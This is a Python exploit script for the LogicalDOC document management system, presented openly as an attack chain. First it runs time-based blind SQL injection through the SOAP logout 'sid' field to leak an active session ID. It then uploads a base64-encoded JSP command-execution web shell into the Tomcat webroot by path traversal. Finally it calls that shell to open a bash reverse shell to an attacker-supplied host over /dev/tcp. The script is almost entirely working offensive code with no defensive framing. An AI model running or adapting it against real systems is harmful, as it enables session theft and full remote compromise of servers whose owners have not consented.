import requests, string, argparse
import concurrent.futures

schema = 'http'
sess = requests.Session()

sid_length = 36 # known value
blank_string = '_' * sid_length
LINE_CLEAR = '\x1b[2K'
sleep_oracle_amount = 3
charset = '-' + string.hexdigits

parser = argparse.ArgumentParser()

parser.add_argument('-lh', '--lhost')
parser.add_argument('-lp', '--lport')
parser.add_argument('-rh', '--rhost')    
parser.add_argument('-rp', '--rport')
parser.add_argument('-ss', '--sleep-seconds', default=3)
parser.add_argument('-mw', '--max-workers', default=10, type=int)


args = parser.parse_args()

host = args.rhost if args.rhost else "localhost"
port = args.rport if args.rport else 8123
l_ip = args.lhost if args.lhost else "192.168.1.75"
l_port = args.lport if args.lport else "1234"


payload = """
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ws="http://ws.logicaldoc.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ws:logout>
         <sid>sdfsdf\\\' AND {}-- gg</sid>
      </ws:logout>
   </soapenv:Body>
</soapenv:Envelope>
""".lstrip()


# check at least one session, some weirdness in the query to make it work with same table
confirm_sessions = f'(select * from (select count(ld_sid) from ld_session where ld_deleted=0) AS GG)>0 and (select * from (select sleep({sleep_oracle_amount}))ggez)'
r = sess.post(f"{schema}://{host}:{port}/services/Auth", data=payload.format(confirm_sessions), headers={'Content-Type': 'text/xml'})


if r.elapsed.total_seconds() > sleep_oracle_amount:
    print('[+] success, valid sessions in DB!') 
else:
    print('[-] no sessions found :(')
    exit()


# Leak the string

def find_char(index):
    for c in charset:
        # aHaGK32NOuwfKOyB' union SELECT CASE WHEN ((SELECT SUBSTR(password,1,1) from users where username='administrator')='A') THEN TO_CHAR(1/0) ELSE NULL END FROM dual--
        leak_payload = f'(select * from (select ascii(substr(ld_sid, {index}, 1)) from ld_session where ld_deleted=0  and ld_finished is NULL LIMIT 1) AS GG)={ord(c)} and (select * from (select sleep({sleep_oracle_amount}))ggez)'
        r = sess.post(f"{schema}://{host}:{port}/services/Auth", data=payload.format(leak_payload), headers={'Content-Type': 'text/xml'})

        if r.elapsed.total_seconds() > sleep_oracle_amount:
            return c

with concurrent.futures.ThreadPoolExecutor(max_workers=args.max_workers) as executor:
    # Start the load operations and mark each future with its URL
    future_to_index = {executor.submit(find_char, i): i for i in range(1, sid_length + 1)}
    for future in concurrent.futures.as_completed(future_to_index):
        index = future_to_index[future] -1
        try:
            c = future.result()
        except Exception as exc:
            print('%r generated an exception: %s' % (url, exc))
        else:
            blank_string = blank_string[:index] + c + blank_string[index + 1:]
            print(f'[+] Leaking... {blank_string}', end='\r')

print(end=LINE_CLEAR)
print(f'[+] Leaked: {blank_string}')

sid = blank_string

proxy = False
sess.proxies.update({'http':'http://0.0.0.0:8080'}) if proxy else 0

############################
# traversal could be :
# ../../../../../../../LogicalDOC/tomcat/webapps/ROOT/
# ../../../../../../../opt/logicaldoc/tomcat/webapps/ROOT/
# or something custom

payload2 = f"""
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ws="http://ws.logicaldoc.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ws:uploadResource>
         <sid>{sid}</sid>
         <docId>101</docId>
         <fileVersion>../../../../../../../opt/logicaldoc/tomcat/webapps/ROOT/gg</fileVersion>
         <suffix>.jsp</suffix>
         <content>PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT4KPCUKLy8KLy8gSlNQX0tJVAovLwovLyBjbWQuanNwID0gQ29tbWFuZCBFeGVjdXRpb24gKHVuaXgpCi8vCi8vIGJ5OiBVbmtub3duCi8vIG1vZGlmaWVkOiAyNy8wNi8yMDAzCi8vCiU+CjxIVE1MPjxCT0RZPgo8Rk9STSBNRVRIT0Q9IkdFVCIgTkFNRT0ibXlmb3JtIiBBQ1RJT049IiI+CjxJTlBVVCBUWVBFPSJ0ZXh0IiBOQU1FPSJjbWQiPgo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZCI+CjwvRk9STT4KPHByZT4KPCUKaWYgKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSAhPSBudWxsKSB7CiAgICAgICAgb3V0LnByaW50bG4oIkNvbW1hbmQ6ICIgKyByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgKyAiPEJSPiIpOwogICAgICAgIFByb2Nlc3MgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgICAgICBPdXRwdXRTdHJlYW0gb3MgPSBwLmdldE91dHB1dFN0cmVhbSgpOwogICAgICAgIElucHV0U3RyZWFtIGluID0gcC5nZXRJbnB1dFN0cmVhbSgpOwogICAgICAgIERhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKICAgICAgICBTdHJpbmcgZGlzciA9IGRpcy5yZWFkTGluZSgpOwogICAgICAgIHdoaWxlICggZGlzciAhPSBudWxsICkgewogICAgICAgICAgICAgICAgb3V0LnByaW50bG4oZGlzcik7IAogICAgICAgICAgICAgICAgZGlzciA9IGRpcy5yZWFkTGluZSgpOyAKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CiU+CjwvcHJlPgo8L0JPRFk+PC9IVE1MPg==</content>
      </ws:uploadResource>
   </soapenv:Body>
</soapenv:Envelope>""".lstrip()

print('[*] Uploading payload...')

sess.post(f'{schema}://{host}:{port}/services/Document/uploadResource', data=payload2, cookies={'ldoc-sid': sid}, headers={'Content-Type': 'text/xml'})


print('[*] triggering reverse shell...')


reverse_shell_payload = f'/bin/bash -c bash${{IFS}}-i${{IFS}}>%26/dev/tcp/{l_ip}/{l_port}<%261'

sess.get(f'{schema}://{host}:{port}/gg-.jsp?cmd={reverse_shell_payload}')
